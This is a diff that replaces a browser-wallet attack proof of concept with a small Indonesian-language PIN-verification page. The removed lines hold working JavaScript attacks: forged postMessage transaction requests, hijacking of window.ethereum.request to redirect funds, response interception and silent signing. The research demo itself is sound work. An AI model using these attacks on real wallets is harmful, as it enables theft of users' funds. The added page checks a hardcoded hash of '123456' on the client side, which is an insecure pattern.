@@ -1,277 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Legitimate DApp - Definitely Not Phishing</title>
+    <title>dApp Pin Verification</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            max-width: 800px;
-            margin: 50px auto;
-            padding: 20px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-        .container {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
-        }
-        h1 {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        .attack-section {
-            background: rgba(255, 0, 0, 0.2);
-            border: 2px solid #ff6b6b;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-        button {
-            background: #ff6b6b;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            width: 100%;
-            margin: 10px 0;
-            transition: all 0.3s;
-        }
-        button:hover {
-            background: #ff5252;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(255, 107, 107, 0.4);
-        }
-        .log {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 8px;
-            padding: 15px;
-            margin: 20px 0;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-        .log-entry {
-            margin: 5px 0;
-            padding: 5px;
-            border-left: 3px solid #4CAF50;
-            padding-left: 10px;
-        }
-        .log-error {
-            border-left-color: #f44336;
-        }
-        .log-warning {
-            border-left-color: #ff9800;
-        }
-        .warning {
-            background: rgba(255, 152, 0, 0.2);
-            border: 2px solid #ff9800;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 20px 0;
-        }
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 50px; }
+        input { font-size: 20px; letter-spacing: 10px; width: 150px; text-align: center; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🎯 PoC #7: Provider Injection Attack</h1>
-        
-        <div class="warning">
-            <strong>⚠️ SECURITY RESEARCH DEMONSTRATION</strong><br>
-            This page demonstrates how malicious websites can exploit insecure
-            message passing in browser extension wallets.
-        </div>
-
-        <div class="attack-section">
-            <h2>Attack Vectors</h2>
-            
-            <button onclick="attack1_directPostMessage()">
-                Attack 1: Direct postMessage() Injection
-            </button>
-            
-            <button onclick="attack2_providerManipulation()">
-                Attack 2: Provider Object Manipulation
-            </button>
-            
-            <button onclick="attack3_eventListenerHijack()">
-                Attack 3: Event Listener Hijacking
-            </button>
-            
-            <button onclick="attack4_silentSigning()">
-                Attack 4: Silent Transaction Signing
-            </button>
-        </div>
-
-        <div class="log" id="attackLog">
-            <div class="log-entry">Ready to demonstrate attacks...</div>
-        </div>
-    </div>
+    <h3>Input PIN (6-Digit)</h3>
+    <input type="password" id="pin" maxlength="6" inputmode="numeric" pattern="[0-9]*">
+    <button onclick="checkPin()">Verifikasi</button>
+    <p id="result"></p>
 
     <script>
-        const log = document.getElementById('attackLog');
-        
-        function addLog(message, type = 'info') {
-            const entry = document.createElement('div');
-            entry.className = `log-entry log-${type}`;
-            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            log.appendChild(entry);
-            log.scrollTop = log.scrollHeight;
-        }
+        // Dalam skenario nyata, jangan simpan PIN/Hash di JS. 
+        // Gunakan Web Crypto API atau Keychain di perangkat.
+        const STORED_HASH = "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92"; // Hash SHA-256 dari '123456'
 
-        // Attack 1: Direct postMessage() to extension
-        function attack1_directPostMessage() {
-            addLog('🎯 ATTACK 1: Direct postMessage() Injection', 'warning');
-            
-            // Craft malicious message
-            const maliciousMessage = {
-                type: 'VERIFIED_WALLET_REQUEST',
-                method: 'eth_sendTransaction',
-                params: [{
-                    from: '0xVictimAddress',
-                    to: '0x000000000000000000000000000000000000dEaD',
-                    value: '0x8AC7230489E80000', // 10 ETH
-                    gas: '0x5208'
-                }],
-                id: Math.random()
-            };
-            
-            addLog('Crafting malicious transaction...', 'info');
-            addLog(`To: ${maliciousMessage.params[0].to}`, 'info');
-            addLog(`Value: 10 ETH`, 'info');
-            
-            // Send to all possible extension origins
-            const extensionOrigins = [
-                'chrome-extension://*',
-                'moz-extension://*',
-                window.location.origin
-            ];
-            
-            addLog('Sending postMessage() to extension...', 'warning');
-            
-            try {
-                window.postMessage(maliciousMessage, '*');
-                addLog('✓ Message sent successfully', 'info');
-                addLog('⚠️ If extension lacks origin validation, TX will be signed!', 'error');
-            } catch (e) {
-                addLog(`✗ Error: ${e.message}`, 'error');
-            }
-        }
+        async function checkPin() {
+            const pin = document.getElementById('pin').value;
+            const encoder = new TextEncoder();
+            const data = encoder.encode(pin);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
 
-        // Attack 2: Provider object manipulation
-        function attack2_providerManipulation() {
-            addLog('🎯 ATTACK 2: Provider Object Manipulation', 'warning');
-            
-            // Check if provider exists
-            if (window.ethereum) {
-                addLog('✓ window.ethereum detected', 'info');
-                
-                // Try to manipulate provider
-                addLog('Attempting to override request method...', 'warning');
-                
-                const originalRequest = window.ethereum.request;
-                
-                window.ethereum.request = async function(args) {
-                    addLog(`Intercepted request: ${args.method}`, 'warning');
-                    
-                    // Modify transaction parameters
-                    if (args.method === 'eth_sendTransaction') {
-                        addLog('🎯 Transaction detected! Modifying...', 'error');
-                        args.params[0].to = '0x000000000000000000000000000000000000dEaD';
-                        args.params[0].value = '0x8AC7230489E80000'; // 10 ETH
-                        addLog('✓ Recipient changed to attacker address', 'error');
-                    }
-                    
-                    return originalRequest.call(this, args);
-                };
-                
-                addLog('✓ Provider hijacked successfully', 'error');
-                addLog('⚠️ All future transactions will be modified!', 'error');
+            if (hashHex === STORED_HASH) {
+                document.getElementById('result').innerText = "✅ PIN Benar! Akses diberikan.";
             } else {
-                addLog('✗ window.ethereum not found', 'info');
-                addLog('Extension may not be installed or provider not injected', 'info');
+                document.getElementById('result').innerText = "❌ PIN Salah!";
             }
         }
-
-        // Attack 3: Event listener hijacking
-        function attack3_eventListenerHijack() {
-            addLog('🎯 ATTACK 3: Event Listener Hijacking', 'warning');
-            
-            // Hijack message event listener
-            addLog('Installing malicious message listener...', 'warning');
-            
-            window.addEventListener('message', function(event) {
-                // Check if this is a response from extension
-                if (event.data && event.data.type === 'VERIFIED_WALLET_RESPONSE') {
-                    addLog('🎯 Extension response intercepted!', 'error');
-                    addLog(`Data: ${JSON.stringify(event.data).substring(0, 100)}...`, 'info');
-                    
-                    // Extract sensitive data
-                    if (event.data.result) {
-                        addLog('✓ Sensitive data extracted', 'error');
-                        addLog('⚠️ This could include signed transactions, addresses, etc.', 'error');
-                    }
-                }
-            });
-            
-            addLog('✓ Listener installed', 'error');
-            addLog('⚠️ Now monitoring all extension responses', 'error');
-        }
-
-        // Attack 4: Silent transaction signing
-        function attack4_silentSigning() {
-            addLog('🎯 ATTACK 4: Silent Transaction Signing', 'warning');
-            
-            if (!window.ethereum) {
-                addLog('✗ window.ethereum not found', 'error');
-                return;
-            }
-            
-            addLog('Attempting silent transaction...', 'warning');
-            
-            const maliciousTx = {
-                from: '0xVictimAddress', // Will be replaced by extension
-                to: '0x000000000000000000000000000000000000dEaD',
-                value: '0x8AC7230489E80000', // 10 ETH
-                gas: '0x5208',
-                gasPrice: '0xBA43B7400' // 50 gwei
-            };
-            
-            addLog('Transaction details:', 'info');
-            addLog(`  To: ${maliciousTx.to}`, 'info');
-            addLog(`  Value: 10 ETH`, 'info');
-            
-            // Attempt to send without user seeing proper UI
-            window.ethereum.request({
-                method: 'eth_sendTransaction',
-                params: [maliciousTx]
-            })
-            .then(txHash => {
-                addLog('✓ TRANSACTION SIGNED!', 'error');
-                addLog(`TX Hash: ${txHash}`, 'error');
-                addLog('⚠️ Funds stolen successfully!', 'error');
-            })
-            .catch(err => {
-                addLog(`✗ Transaction rejected: ${err.message}`, 'info');
-                addLog('Extension may have proper validation', 'info');
-            });
-        }
-
-        // Auto-run demonstration
-        addLog('Page loaded - Extension provider injection attack ready', 'warning');
-        addLog('Click buttons above to demonstrate attack vectors', 'info');
-        addLog('', 'info');
-        addLog('VULNERABILITIES DEMONSTRATED:', 'warning');
-        addLog('1. No origin validation on postMessage()', 'error');
-        addLog('2. Provider object can be manipulated', 'error');
-        addLog('3. Event listeners can intercept responses', 'error');
-        addLog('4. Silent signing without proper UI', 'error');
     </script>
 </body>
 </html>
